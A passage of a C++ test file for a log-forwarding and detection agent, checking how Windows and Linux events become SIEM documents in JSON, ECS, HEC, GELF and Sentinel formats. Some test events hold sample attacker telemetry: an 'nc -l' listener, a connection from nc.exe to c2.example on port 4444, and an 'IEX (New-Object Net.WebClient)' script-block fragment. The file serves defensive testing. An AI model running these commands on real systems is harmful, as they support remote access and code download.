                "logsource:\n  product: windows\n  category: process_creation\n"
                "detection:\n  selection:\n    EventID: 4688\n    NewProcessName|endswith: '\\calc.exe'\n  condition: selection\n"
                "elf:\n  actions:\n    - type: alert\n      destination: jalerts\n      message: \"calc seen\"\n"
                "    - type: forward_buffer\n      destination: jlake\n";
            LoadSummary s = loadRules("test_rules_json", "");
            CHECK(s.parsed == 1);
            EventBuffer buf; Forwarder fwd; fwd.setConfig(jc); RuleEngine eng(buf, fwd);
            eng.reload(s.rules);
            buf.push(makeEvt(4624, L"Security", {{L"TargetUserName", L"alice"}, {L"LogonType", L"3"}}).xml);
            buf.push(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"},
                                                 {L"NewProcessId", L"0x1f4"}, {L"CommandLine", L"calc.exe /x"},
                                                 {L"SubjectUserName", L"bob"}, {L"SubjectDomainName", L"LAB"}}).xml);
            CHECK(eng.evaluateOnce() == 1);
            auto al = lines(slurp("json_alerts.ndjson"));
            CHECK(al.size() == 1);
            std::string fireId;   // the alert id of this rule fire
            if (al.size() == 1) {
                json a = json::parse(al[0], nullptr, false);
                CHECK(!a.is_discarded());
                CHECK(a["event_id"] == 4688);
                CHECK(a["host"] == "HOST");
                CHECK(a["channel"] == "Security");
                CHECK(a["event_data"]["NewProcessName"] == "C:\\Windows\\System32\\calc.exe");
                CHECK(a["elf"]["kind"] == "alert");
                CHECK(a["elf"]["action"] == "alert");
                CHECK(a["elf"]["rule_id"] == "win_json_fmt");
                CHECK(a["elf"]["rule_name"] == "JSON format test");
                CHECK(a["elf"]["level"] == "low");
                CHECK(a["elf"]["category"] == "process_creation");
                // The engine's alert message is the rule description, not
                // the action's own `message` field.
                CHECK(a["elf"]["message"] == "Calc launched (test)");
                CHECK(a["elf"]["agent_id"] == "agent-test");
                CHECK(a.contains("@timestamp") && a.contains("received_at"));
                // 16 hex digits, generated per fire.
                fireId = a["elf"].value("alert_id", "");
                CHECK(fireId.size() == 16 && fireId.find_first_not_of("0123456789abcdef") == std::string::npos);
            }
            auto lk = lines(slurp("json_lake.ndjson"));
            CHECK(lk.size() == 2);   // both buffered events, one doc per line
            if (lk.size() == 2) {
                json e0 = json::parse(lk[0]); json e1 = json::parse(lk[1]);
                CHECK(e0["event_id"] == 4624 && e1["event_id"] == 4688);
                CHECK(e0["elf"]["kind"] == "event" && e0["elf"]["action"] == "forward_buffer");
                CHECK(e0["elf"]["rule_id"] == "win_json_fmt");
                CHECK(!e0["elf"].contains("message"));
                // The batch of the same fire carries the alert's id on every
                // event, so alert + context can be joined in the SIEM.
                CHECK(!fireId.empty() && e0["elf"]["alert_id"] == fireId && e1["elf"]["alert_id"] == fireId);
            }
            fs::remove_all("test_rules_json");
            std::remove("json_alerts.ndjson"); std::remove("json_lake.ndjson");
        }

        // --- ECS builders per event type ---
        RuleMeta meta;
        meta.id = "win_ecs_rule"; meta.name = "ECS rule"; meta.level = "low";
        meta.category = "process_creation"; meta.description = "desc";
        meta.tags = {"attack.execution", "attack.t1059.001", "attack.lateral_movement"};
        Destination ecsDest = parseDestinationUrl("e", "file://ecs.ndjson?format=ecs");
        FormatContext ctx; ctx.dest = &ecsDest; ctx.rule = &meta; ctx.agentId = "agent-test"; ctx.action = "forward_event";
        {
            BufferedEvent e = makeEvt(4688, L"Security",
                {{L"NewProcessName", L"C:\\Windows\\System32\\calc.exe"}, {L"NewProcessId", L"0x1f4"},
                 {L"CommandLine", L"calc.exe /x"}, {L"ProcessId", L"0x10"},
                 {L"ParentProcessName", L"C:\\Windows\\explorer.exe"},
                 {L"SubjectUserName", L"bob"}, {L"SubjectDomainName", L"LAB"}, {L"SubjectLogonId", L"0x3e7"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["code"] == "4688");
            CHECK(d["event"]["kind"] == "event");
            CHECK(d["event"]["category"] == json::array({"process"}));
            CHECK(d["event"]["type"] == json::array({"start"}));
            CHECK(d["event"]["action"] == "created-process");
            CHECK(d["event"]["dataset"] == "windows.security");
            CHECK(d["process"]["pid"] == 500);                 // 0x1f4
            CHECK(d["process"]["name"] == "calc.exe");
            CHECK(d["process"]["executable"] == "C:\\Windows\\System32\\calc.exe");
            CHECK(d["process"]["command_line"] == "calc.exe /x");
            CHECK(d["process"]["parent"]["pid"] == 16);
            CHECK(d["process"]["parent"]["name"] == "explorer.exe");
            CHECK(d["user"]["name"] == "bob" && d["user"]["domain"] == "LAB");
            CHECK(d["winlog"]["logon"]["id"] == "0x3e7");
            CHECK(d["winlog"]["event_data"]["NewProcessName"] == "C:\\Windows\\System32\\calc.exe");  // case preserved
            CHECK(d["host"]["name"] == "HOST");
            CHECK(d["agent"]["type"] == "elf" && d["agent"]["id"] == "agent-test");
            CHECK(d["rule"]["id"] == "win_ecs_rule");
            CHECK(d["elf"]["action"] == "forward_event");
            CHECK(!d.contains("threat"));                     // events carry no alert decoration
        }
        {
            BufferedEvent e = makeEvt(4624, L"Security",
                {{L"TargetUserName", L"alice"}, {L"TargetDomainName", L"LAB"}, {L"LogonType", L"10"},
                 {L"IpAddress", L"192.0.2.10"}, {L"IpPort", L"51000"}, {L"WorkstationName", L"WS1"},
                 {L"ProcessName", L"C:\\Windows\\System32\\svchost.exe"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["category"] == json::array({"authentication"}));
            CHECK(d["event"]["outcome"] == "success");
            CHECK(d["event"]["action"] == "logged-in");
            CHECK(d["user"]["name"] == "alice");
            CHECK(d["source"]["ip"] == "192.0.2.10" && d["source"]["port"] == 51000);
            CHECK(d["source"]["domain"] == "WS1");
            CHECK(d["winlog"]["logon"]["type"] == "RemoteInteractive");
            CHECK(d["process"]["name"] == "svchost.exe");
            BufferedEvent f = makeEvt(4625, L"Security", {{L"TargetUserName", L"x"}, {L"IpAddress", L"-"}, {L"LogonType", L"3"}});
            json g = buildEcsDoc(f, ctx, false);
            CHECK(g["event"]["outcome"] == "failure" && g["event"]["action"] == "logon-failed");
            CHECK(!g.contains("source"));                    // "-" is not a usable value
            CHECK(g["winlog"]["logon"]["type"] == "Network");
        }
        {
            BufferedEvent e = makeEvt(5156, L"Security",
                {{L"SourceAddress", L"192.0.2.5"}, {L"SourcePort", L"49152"}, {L"DestAddress", L"192.0.2.9"},
                 {L"DestPort", L"445"}, {L"Protocol", L"6"}, {L"Direction", L"%%14593"}, {L"ProcessID", L"1234"},
                 {L"Application", L"\\device\\harddiskvolume1\\windows\\system32\\svchost.exe"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["category"] == json::array({"network"}));
            CHECK(d["event"]["type"] == json::array({"connection", "allowed"}));
            CHECK(d["source"]["ip"] == "192.0.2.5" && d["destination"]["port"] == 445);
            CHECK(d["network"]["transport"] == "tcp");
            CHECK(d["network"]["direction"] == "egress");
            CHECK(d["process"]["pid"] == 1234);
        }
        {
            BufferedEvent e = makeEvt(1, L"Microsoft-Windows-Sysmon/Operational",
                {{L"Image", L"C:\\Tools\\nc.exe"}, {L"ProcessId", L"777"}, {L"ProcessGuid", L"{guid-1}"},
                 {L"CommandLine", L"nc -l"}, {L"ParentImage", L"C:\\Windows\\System32\\cmd.exe"},
                 {L"ParentProcessId", L"42"}, {L"User", L"LAB\\carol"},
                 {L"Hashes", L"SHA256=ABCD,MD5=1234,IMPHASH=ZZ"}, {L"OriginalFileName", L"nc.exe"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["dataset"] == "windows.sysmon_operational");
            CHECK(d["event"]["category"] == json::array({"process"}) && d["event"]["type"] == json::array({"start"}));
            CHECK(d["event"]["action"] == "process-create");
            CHECK(d["process"]["pid"] == 777 && d["process"]["entity_id"] == "{guid-1}");
            CHECK(d["process"]["name"] == "nc.exe" && d["process"]["parent"]["pid"] == 42);
            CHECK(d["process"]["hash"]["sha256"] == "abcd" && d["process"]["hash"]["md5"] == "1234");
            CHECK(d["process"]["pe"]["original_file_name"] == "nc.exe");
            CHECK(d["user"]["name"] == "carol" && d["user"]["domain"] == "LAB");
        }
        {
            BufferedEvent e = makeEvt(3, L"Microsoft-Windows-Sysmon/Operational",
                {{L"Image", L"C:\\Tools\\nc.exe"}, {L"ProcessId", L"777"}, {L"Protocol", L"TCP"},
                 {L"Initiated", L"true"}, {L"SourceIsIpv6", L"false"}, {L"SourceIp", L"192.0.2.5"},
                 {L"SourcePort", L"5000"}, {L"DestinationIp", L"192.0.2.77"}, {L"DestinationPort", L"4444"},
                 {L"DestinationHostname", L"c2.example"}, {L"User", L"LAB\\carol"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["category"] == json::array({"network"}));
            CHECK(d["event"]["action"] == "network-connection");
            CHECK(d["destination"]["ip"] == "192.0.2.77" && d["destination"]["port"] == 4444);
            CHECK(d["destination"]["domain"] == "c2.example");
            CHECK(d["network"]["transport"] == "tcp" && d["network"]["type"] == "ipv4");
            CHECK(d["network"]["direction"] == "egress");
            CHECK(d["process"]["name"] == "nc.exe");
        }
        {
            BufferedEvent e = makeEvt(7045, L"System",
                {{L"ServiceName", L"EvilSvc"}, {L"ImagePath", L"\"C:\\Program Files\\evil\\svc.exe\" -run"},
                 {L"ServiceType", L"user mode service"}, {L"AccountName", L"LocalSystem"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["category"] == json::array({"configuration"}));
            CHECK(d["event"]["action"] == "service-installed");
            CHECK(d["service"]["name"] == "EvilSvc");
            CHECK(d["process"]["executable"] == "C:\\Program Files\\evil\\svc.exe");
            CHECK(d["process"]["name"] == "svc.exe");
            CHECK(d["user"]["name"] == "LocalSystem");
        }
        {
            BufferedEvent e = makeEvt(4104, L"Microsoft-Windows-PowerShell/Operational",
                {{L"ScriptBlockText", L"IEX (New-Object Net.WebClient)"}, {L"ScriptBlockId", L"sb-1"},
                 {L"MessageNumber", L"1"}, {L"MessageTotal", L"1"}, {L"Path", L"C:\\t\\x.ps1"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["dataset"] == "windows.powershell_operational");
            CHECK(d["event"]["action"] == "script-block-logged");
            CHECK(d["powershell"]["file"]["script_block_text"] == "IEX (New-Object Net.WebClient)");
            CHECK(d["powershell"]["sequence"] == 1);
            CHECK(d["file"]["name"] == "x.ps1");
        }
        {
            BufferedEvent e = makeEvt(1102, L"Security", {{L"SubjectUserName", L"bob"}});
            json d = buildEcsDoc(e, ctx, false);
            CHECK(d["event"]["category"] == json::array({"iam"}));
            CHECK(d["event"]["action"] == "audit-log-cleared");
            // Unknown event id: common fields only, no guessed category.
            BufferedEvent u = makeEvt(99999, L"Application", {{L"Foo", L"bar"}});
            json ud = buildEcsDoc(u, ctx, false);
            CHECK(ud["event"]["code"] == "99999");
            CHECK(!ud["event"].contains("category"));
            CHECK(ud["winlog"]["event_data"]["Foo"] == "bar");
            CHECK(ud["event"]["dataset"] == "windows.application");
            // Unnamed <Data> elements become param1..N.
            BufferedEvent nn;
            nn.receivedAt = std::chrono::system_clock::now();
            nn.xml = L"<Event><System><Provider Name=\"Test\"/><EventID>7036</EventID><EventRecordID>5</EventRecordID>"
                     L"<Channel>System</Channel><Computer>HOST</Computer></System>"
                     L"<EventData><Data>Spooler</Data><Data>running</Data></EventData></Event>";
            json nd = buildEcsDoc(nn, ctx, false);
            CHECK(nd["winlog"]["event_data"]["param1"] == "Spooler");
            CHECK(nd["winlog"]["event_data"]["param2"] == "running");
        }

        // --- ECS alert decoration: severity, ATT&CK, evidence + truncation ---
        {
            std::vector<BufferedEvent> evidence;
            for (int i = 0; i < 502; ++i)
                evidence.push_back(makeEvt(4625, L"Security", {{L"TargetUserName", L"u" + std::to_wstring(i)}}));
            std::vector<std::string> also = {"win_other_low"};
            FormatContext actx = ctx;
            actx.action = "alert"; actx.message = "brute force"; actx.evidence = &evidence;
            actx.evidenceIsSequence = false; actx.alsoMatched = &also;
            BufferedEvent trig = makeEvt(4625, L"Security", {{L"TargetUserName", L"u501"}});
            json d = buildEcsDoc(trig, actx, true);
            CHECK(d["event"]["kind"] == "alert");
            CHECK(d["event"]["severity"] == 21);                       // low
            CHECK(d["message"] == "brute force");
            CHECK(d["rule"]["name"] == "ECS rule" && d["rule"]["ruleset"] == "sigma");
            CHECK(d["rule"]["description"] == "desc");
            CHECK(d["threat"]["framework"] == "MITRE ATT&CK");
            CHECK(d["threat"]["technique"]["id"] == json::array({"T1059.001"}));
            CHECK(d["threat"]["tactic"]["name"] == json::array({"Execution", "Lateral Movement"}));
            CHECK(d["tags"].size() == 4);                              // "elf" + 3 rule tags
            CHECK(d["elf"]["also_matched"] == json::array({"win_other_low"}));
            CHECK(d["elf"]["evidence_kind"] == "window");
            CHECK(d["elf"]["evidence"].size() == AgentClient::MAX_ALERT_EVIDENCE_EVENTS);
            CHECK(d["elf"]["evidence_truncated"] == 2);
            // the LAST N are kept
            CHECK(d["elf"]["evidence"][0]["winlog"]["event_data"]["TargetUserName"] == "u2");
            RuleMeta crit = meta; crit.level = "critical";
            FormatContext cctx = actx; cctx.rule = &crit;
            CHECK(buildEcsDoc(trig, cctx, true)["event"]["severity"] == 99);
            // json alert carries the same evidence semantics
            json j = buildJsonDoc(trig, actx, true);
            CHECK(j["elf"]["evidence"].size() == AgentClient::MAX_ALERT_EVIDENCE_EVENTS);
            CHECK(j["elf"]["evidence_truncated"] == 2);
            CHECK(j["elf"]["also_matched"] == json::array({"win_other_low"}));
        }

        // --- HEC envelope ---
        {
            Destination hd = parseDestinationUrl("h",
                "https://splunk.example.com:8088/services/collector/event?format=hec&token=tok1&index=elf");
            FormatContext hctx = ctx; hctx.dest = &hd; hctx.action = "alert"; hctx.message = "m";
            BufferedEvent e = makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\x\\calc.exe"}});
            auto payloads = formatAlert(e, hctx);
            CHECK(payloads.size() == 1);
            if (payloads.size() == 1) {
                CHECK(payloads[0].contentType == "application/json");
                CHECK(payloads[0].headers.size() == 1);
                CHECK(payloads[0].headers[0].first == "Authorization" && payloads[0].headers[0].second == "Splunk tok1");
                json env = json::parse(payloads[0].body);
                CHECK(env["host"] == "HOST");
                CHECK(env["source"] == "elf");
                CHECK(env["sourcetype"] == "elf:alert");
                CHECK(env["index"] == "elf");
                CHECK(env["time"].is_number());
                CHECK(env["event"]["elf"]["kind"] == "alert");        // inner doc is ELF json by default
                CHECK(env["event"]["event_data"]["NewProcessName"] == "C:\\x\\calc.exe");
            }
            Destination hd2 = parseDestinationUrl("h2",
                "https://splunk.example.com:8088/services/collector/event?format=hec&token=tok1&event=ecs&sourcetype=custom:st");
            FormatContext hctx2 = ctx; hctx2.dest = &hd2;
            auto p2 = formatEvents({e, e}, hctx2);
            CHECK(p2.size() == 1);
            if (p2.size() == 1) {
                // Two envelopes concatenated with a newline.
                auto parts = lines(p2[0].body);
                CHECK(parts.size() == 2);
                json env = json::parse(parts[0]);
                CHECK(env["sourcetype"] == "custom:st");
                CHECK(env["event"]["event"]["code"] == "4688");        // inner doc is ECS
                CHECK(!env.contains("index"));
            }
        }

        // --- GELF 1.1 ---
        {
            Destination gd = parseDestinationUrl("g", "http://graylog.example.com:12201/gelf?format=gelf");
            FormatContext gctx = ctx; gctx.dest = &gd; gctx.action = "alert"; gctx.message = "m";
            BufferedEvent e = makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\x\\calc.exe"}});
            json g = buildGelf(e, gctx, true);
            CHECK(g["version"] == "1.1");
            CHECK(g["host"] == "HOST");
            CHECK(g["short_message"] == "ECS rule");
            CHECK(g["level"] == 5);                                     // low
            CHECK(g["timestamp"].is_number());
            CHECK(g["_elf_rule_id"] == "win_ecs_rule");
            CHECK(g["_event_data_NewProcessName"] == "C:\\x\\calc.exe");
            CHECK(g["_event_id"] == 4688);
            bool flat = true;
            for (auto it = g.begin(); it != g.end(); ++it) {
                if (it.value().is_object() || it.value().is_array()) flat = false;
                if (it.key() != "version" && it.key() != "host" && it.key() != "short_message" &&
                    it.key() != "full_message" && it.key() != "timestamp" && it.key() != "level" &&
                    it.key()[0] != '_') flat = false;
            }
            CHECK(flat);
            CHECK(buildGelf(e, ctx, false)["level"] == 6);              // plain event: informational
            auto ps = formatEvents({e, e, e}, gctx);
            CHECK(ps.size() == 3);                                       // one POST per message
            CHECK(ps.empty() || ps[0].headers.empty());
        }

        // --- Sentinel rows + array chunking under 1 MB ---
        {
            Destination sd = parseDestinationUrl("s",
                "https://dce.example.com/dataCollectionRules/dcr/streams/Custom-ELF_CL?api-version=2023-01-01&format=sentinel&tenant=t&client=c&secret=x");
            FormatContext sctx = ctx; sctx.dest = &sd; sctx.action = "alert"; sctx.message = "m";
            BufferedEvent e = makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\x\\calc.exe"}});
            json r = buildSentinelRow(e, sctx, true);
            CHECK(r.contains("TimeGenerated"));
            CHECK(r["Host"] == "HOST" && r["EventId"] == 4688);
            CHECK(r["Kind"] == "alert" && r["RuleId"] == "win_ecs_rule");
            CHECK(r["EventData"]["NewProcessName"] == "C:\\x\\calc.exe");
            CHECK(r["Message"] == "m");
            auto ps = formatAlert(e, sctx);
            CHECK(ps.size() == 1);
            if (ps.size() == 1) {
                CHECK(ps[0].headers.empty());                            // bearer added by the worker
                json arr = json::parse(ps[0].body);
                CHECK(arr.is_array() && arr.size() == 1);
            }
            // 2,000 ~1 KB events must split into >1 array, each under 1 MB.
            std::vector<BufferedEvent> big;
            std::wstring pad(900, L'x');
            for (int i = 0; i < 2000; ++i) big.push_back(makeEvt(4688, L"Security", {{L"CommandLine", pad}}));
            auto chunks = formatEvents(big, sctx);
            CHECK(chunks.size() >= 2);
            size_t total = 0; bool ok = true;
            for (auto& c : chunks) {
                if (c.body.size() > 1024 * 1024) ok = false;
                json a = json::parse(c.body, nullptr, false);
                if (a.is_discarded() || !a.is_array()) ok = false; else total += a.size();
            }
            CHECK(ok && total == 2000);
        }

        // --- NDJSON chunking: 2,500 events -> 3 payloads of <=1,000 ---
        {
            Destination jd = parseDestinationUrl("j", "https://siem.example.com/ingest?format=json&token=t");
            FormatContext jctx = ctx; jctx.dest = &jd; jctx.action = "forward_buffer";
            std::vector<BufferedEvent> many;
            for (int i = 0; i < 2500; ++i) many.push_back(makeEvt(4688, L"Security", {{L"CommandLine", L"x"}}));
            auto chunks = formatEvents(many, jctx);
            CHECK(chunks.size() == 3);
            if (chunks.size() == 3) {
                CHECK(lines(chunks[0].body).size() == 1000);
                CHECK(lines(chunks[2].body).size() == 500);
                CHECK(chunks[0].contentType == "application/x-ndjson");
                CHECK(chunks[0].headers.size() == 1 && chunks[0].headers[0].second == "Bearer t");
            }
        }

        // --- raw regression guard: one payload, exact bytes ---
        {
            Destination rd = parseDestinationUrl("r", "file://raw.jsonl");
            FormatContext rctx = ctx; rctx.dest = &rd;
            std::vector<BufferedEvent> two = {makeEvt(4688, L"Security", {{L"A", L"1"}}),
                                              makeEvt(4624, L"Security", {{L"B", L"2"}})};
            auto ps = formatEvents(two, rctx);
            CHECK(ps.size() == 1);
            CHECK(ps.empty() || ps[0].body == rawXmlLines(two));
            CHECK(ps.empty() || ps[0].body == wideToUtf8(two[0].xml) + "\n" + wideToUtf8(two[1].xml));
            rctx.action = "alert"; rctx.message = "m";
            std::vector<std::string> also = {"x_low"};
            rctx.alsoMatched = &also;
            auto ap = formatAlert(two[0], rctx);
            CHECK(ap.size() == 1);
            CHECK(ap.empty() || ap[0].body.rfind("# ELF Alert\nrule_id: win_ecs_rule\nmessage: m\n", 0) == 0);
            // With an alert id the raw header gains an alert_id: line; the
            // structured formats carry it on the document.
            rctx.alertId = "00c0ffee00c0ffee";
            auto ap2 = formatAlert(two[0], rctx);
            CHECK(ap2.size() == 1 && ap2[0].body.rfind("# ELF Alert\nrule_id: win_ecs_rule\nalert_id: 00c0ffee00c0ffee\nmessage: m\n", 0) == 0);
            FormatContext ictx = ctx; ictx.alertId = "00c0ffee00c0ffee"; ictx.action = "forward_buffer";
            CHECK(buildJsonDoc(two[0], ictx, false)["elf"]["alert_id"] == "00c0ffee00c0ffee");
            CHECK(buildEcsDoc(two[0], ictx, false)["elf"]["alert_id"] == "00c0ffee00c0ffee");
            CHECK(buildGelf(two[0], ictx, false)["_elf_alert_id"] == "00c0ffee00c0ffee");
            CHECK(buildSentinelRow(two[0], ictx, false)["AlertId"] == "00c0ffee00c0ffee");
            CHECK(!buildJsonDoc(two[0], ctx, false)["elf"].contains("alert_id"));   // forward_event: no fire
            CHECK(ap.empty() || ap[0].body.find("also_matched: x_low\n") != std::string::npos);
            // Same bytes alertToRawPretty always produced: the pretty-printer
            // puts text content on its own line.
            CHECK(ap.empty() || ap[0].body == alertToRawPretty(two[0], "win_ecs_rule", "m", {}, "Window events", also));
            CHECK(ap.empty() || ap[0].body.find("<EventID>\n") != std::string::npos);
            CHECK(ap.empty() || ap[0].body.find("4688") != std::string::npos);
        }

        // --- Header block assembly / parsing ---
        {
            std::string blob = PostWorker::makeHeaderBlock("application/json",
                {{"Authorization", "Splunk x"}, {"X-Custom", "1"}}, true);
            CHECK(blob == "Content-Type: application/json\r\nAuthorization: Splunk x\r\nX-Custom: 1\r\nX-ELF-Insecure: 1\r\n");
            HttpRequestOptions o = PostWorker::parseHeaderBlock(blob);
            CHECK(o.contentType == "application/json");
            CHECK(o.insecure);
            CHECK(o.headers.size() == 2);
            CHECK(o.headers.size() == 2 && o.headers[0].first == "Authorization" && o.headers[0].second == "Splunk x");
            CHECK(blob.find("Bearer") == std::string::npos);
            std::string wire = HttpClient::buildHeaderBlock(o, true);
            CHECK(wire.find("X-ELF-Insecure") == std::string::npos);   // pseudo-header never hits the wire
            CHECK(wire.find("Authorization: Splunk x\r\n") != std::string::npos);
            HttpRequestOptions empty = PostWorker::parseHeaderBlock("");
            CHECK(empty.contentType == "application/json" && !empty.insecure && empty.headers.empty());
        }

        // --- Spool record v2 round-trip, v1 compatibility, corrupt magic ---
        {
            fs::remove_all("test_spool_v2"); fs::create_directories("test_spool_v2");
            {
                SpoolQueue q;
                q.setDirectory("test_spool_v2", 100 * 1024 * 1024);
                CHECK(q.enqueue("http://siem/a", "Authorization: Splunk x\r\n", "body-a"));
                CHECK(q.enqueue("http://siem/b", "body-b"));            // 2-arg form: empty headers
                // Hand-write a v1 record (no magic) as an older build would.
                auto be32 = [](uint32_t v) { std::string s(4, '\0');
                    s[0] = char(v >> 24); s[1] = char(v >> 16); s[2] = char(v >> 8); s[3] = char(v); return s; };
                std::string v1 = be32(12) + "http://old/c" + be32(6) + "body-c";
                { std::ofstream f("test_spool_v2/00000000000000000003.spool", std::ios::binary); f << v1; }
                // Corrupt: magic present but truncated.
                { std::ofstream f("test_spool_v2/00000000000000000004.spool", std::ios::binary); f << "ELF2" << be32(99); }
            }
            SpoolQueue q2;
            q2.setDirectory("test_spool_v2", 100 * 1024 * 1024);
            CHECK(q2.load() == 4);
            uint64_t id = 0; std::string url, hdr, body;
            CHECK(q2.dequeue(id, url, hdr, body));
            CHECK(url == "http://siem/a" && hdr == "Authorization: Splunk x\r\n" && body == "body-a");
            q2.ack(id);
            CHECK(q2.dequeue(id, url, hdr, body));
            CHECK(url == "http://siem/b" && hdr.empty() && body == "body-b");
            q2.ack(id);
            CHECK(q2.dequeue(id, url, hdr, body));
            CHECK(url == "http://old/c" && hdr.empty() && body == "body-c");   // v1 still readable
            q2.ack(id);
            // The corrupt entry is dropped; with nothing left, stop() makes dequeue return false.
            std::thread stopper([&] { std::this_thread::sleep_for(std::chrono::milliseconds(200)); q2.stop(); });
            CHECK(!q2.dequeue(id, url, hdr, body));
            stopper.join();
            CHECK(!fs::exists("test_spool_v2/00000000000000000004.spool"));
            fs::remove_all("test_spool_v2");
        }

        // --- Forwarder: an http destination with the spool running goes through
        //     PostWorker with the format's headers (the entry lands on disk) ---
        {
            fs::remove_all("test_spool_dest"); fs::create_directories("test_spool_dest");
            Config hc = cfg;
            hc.destinations["hec"] = parseDestinationUrl("hec",
                "http://127.0.0.1:9/services/collector/event?format=hec&token=lab&insecure=1");
            {
                Forwarder fwd; fwd.setConfig(hc);
                fwd.initDestinationSpool("test_spool_dest", 10 * 1024 * 1024);
                // Nothing listens on port 9: the worker must requeue, not drop.
                fwd.forwardAlert(makeEvt(4688, L"Security", {{L"NewProcessName", L"C:\\x\\calc.exe"}}),
                                 "hec", meta, "m");
                std::this_thread::sleep_for(std::chrono::milliseconds(300));
            }   // ~Forwarder stops the worker; the entry stays on disk
            SpoolQueue q; q.setDirectory("test_spool_dest", 10 * 1024 * 1024);
            CHECK(q.load() == 1);
            uint64_t id = 0; std::string url, hdr, body;
            CHECK(q.dequeue(id, url, hdr, body));
            CHECK(url == "http://127.0.0.1:9/services/collector/event");       // options stripped
            CHECK(hdr.find("Authorization: Splunk lab\r\n") != std::string::npos);
            CHECK(hdr.find("X-ELF-Insecure: 1\r\n") != std::string::npos);
            CHECK(body.find("\"sourcetype\":\"elf:alert\"") != std::string::npos);
            q.ack(id);
            fs::remove_all("test_spool_dest");
        }
    }

    // ============================================================
    // LINUX JOURNAL EVENTS
    // ------------------------------------------------------------
    // The Linux collector renders journal entries into the same event
    // envelope the engine and the formats consume. The ECS mapping keys on
    // the TRANSPORT field every journal entry carries, so it is tested
    // here on both platforms with hand-built events; the renderer and the
    // audit joiner themselves only build on Linux.
    // ============================================================
    {
        using json = nlohmann::json;
        auto journalEvt = [](const std::wstring& channel, int eid,
                             const std::vector<std::pair<std::wstring, std::wstring>>& data) {
            std::vector<std::pair<std::wstring, std::wstring>> d = data;
            d.push_back({L"TRANSPORT", channel == L"audit" ? L"audit" : L"syslog"});
            d.push_back({L"SYSLOG_IDENTIFIER", channel});
            return makeEvt(eid, channel, d);
        };
        Destination ecsDest = parseDestinationUrl("ecs", "file://lin_ecs.ndjson?format=ecs");
        RuleMeta meta; meta.id = "lin_rule"; meta.name = "Linux rule"; meta.level = "medium";
        FormatContext ctx;
        ctx.dest = &ecsDest; ctx.rule = &meta; ctx.agentId = "lin-agent"; ctx.action = "forward_event";
        auto ecsOf = [&](const BufferedEvent& e) {
            std::vector<BufferedEvent> one{e};
            auto ps = formatEvents(one, ctx);
            CHECK(ps.size() == 1);
            json d = ps.empty() ? json::object() : json::parse(ps[0].body, nullptr, false);
            CHECK(!d.is_discarded());
            return d;
        };

        // sshd: accepted login -> authentication/start, user, source, method.
        {
            json d = ecsOf(journalEvt(L"sshd-session", 0, {
                {L"Message", L"Accepted publickey for cole from 10.35.69.7 port 5555 ssh2: ED25519 SHA256:abc"},
                {L"PRIORITY", L"6"}, {L"SYSLOG_FACILITY", L"4"}, {L"pid", L"4242"}, {L"uid", L"0"}}));
            CHECK(d["event"]["module"] == "system");
            CHECK(d["event"]["dataset"] == "system.auth");
            CHECK(d["event"]["category"] == json::array({"authentication"}));
            CHECK(d["event"]["type"] == json::array({"start"}));
            CHECK(d["event"]["action"] == "ssh_login");
            CHECK(d["event"]["outcome"] == "success");
            CHECK(d["user"]["name"] == "cole");
            CHECK(d["source"]["ip"] == "10.35.69.7");
            CHECK(d["source"]["port"] == 5555);
            CHECK(d["auth"]["method"] == "publickey");
            CHECK(d["process"]["pid"] == 4242);
            CHECK(d["log"]["syslog"]["identifier"] == "sshd-session");
            CHECK(d["log"]["syslog"]["priority"] == 6);
            CHECK(d["host"]["os"]["type"] == "linux");
            CHECK(d.contains("journald") && !d.contains("winlog"));
            CHECK(d["journald"]["fields"]["SYSLOG_IDENTIFIER"] == "sshd-session");
            CHECK(d["event"]["sequence"].is_number());
        }
        // sshd: failed password for an invalid user -> failure, user from "invalid user X".
        {
            json d = ecsOf(journalEvt(L"sshd", 0, {
                {L"Message", L"Failed password for invalid user admin from 203.0.113.9 port 40000 ssh2"}}));
            CHECK(d["event"]["outcome"] == "failure");
            CHECK(d["user"]["name"] == "admin");
            CHECK(d["source"]["ip"] == "203.0.113.9");
            CHECK(d["auth"]["method"] == "password");
        }
        // sudo: command line, effective user, working directory.
        {
            json d = ecsOf(journalEvt(L"sudo", 0, {
                {L"Message", L"cole : TTY=pts/0 ; PWD=/home/cole ; USER=root ; COMMAND=/usr/bin/apt install nmap"}}));
            CHECK(d["event"]["category"] == json::array({"process"}));
            CHECK(d["event"]["action"] == "sudo_command");
            CHECK(d["event"]["outcome"] == "success");
            CHECK(d["user"]["name"] == "cole");
            CHECK(d["user"]["effective"]["name"] == "root");
            CHECK(d["process"]["command_line"] == "/usr/bin/apt install nmap");
            CHECK(d["process"]["executable"] == "/usr/bin/apt");
            CHECK(d["process"]["name"] == "apt");
            CHECK(d["process"]["working_directory"] == "/home/cole");
        }
        // useradd: account creation -> iam/user/creation with name and ids.
        {
            json d = ecsOf(journalEvt(L"useradd", 0, {
                {L"Message", L"new user: name=bob, UID=1001, GID=1001, home=/home/bob, shell=/bin/bash"}}));
            CHECK(d["event"]["category"] == json::array({"iam"}));
            CHECK(d["event"]["type"] == json::array({"user", "creation"}));
            CHECK(d["user"]["name"] == "bob");
            CHECK(d["user"]["id"] == "1001");
        }
        // audit EXECVE (joined with its SYSCALL record): process fields and argv.
        {
            json d = ecsOf(journalEvt(L"audit", 1309, {
                {L"type", L"EXECVE"}, {L"AuditId", L"2047"}, {L"argc", L"3"},
                {L"a0", L"head"}, {L"a1", L"-c"}, {L"a2", L"1500"},
                {L"CommandLine", L"head -c 1500"}, {L"exe", L"/usr/bin/head"},
                {L"NewProcessName", L"/usr/bin/head"}, {L"pid", L"927615"}, {L"ppid", L"927598"},
                {L"uid", L"1000"}, {L"euid", L"1000"}, {L"gid", L"1000"}, {L"auid", L"1000"},
                {L"key", L"elf_exec"}, {L"success", L"yes"}, {L"syscall", L"59"},
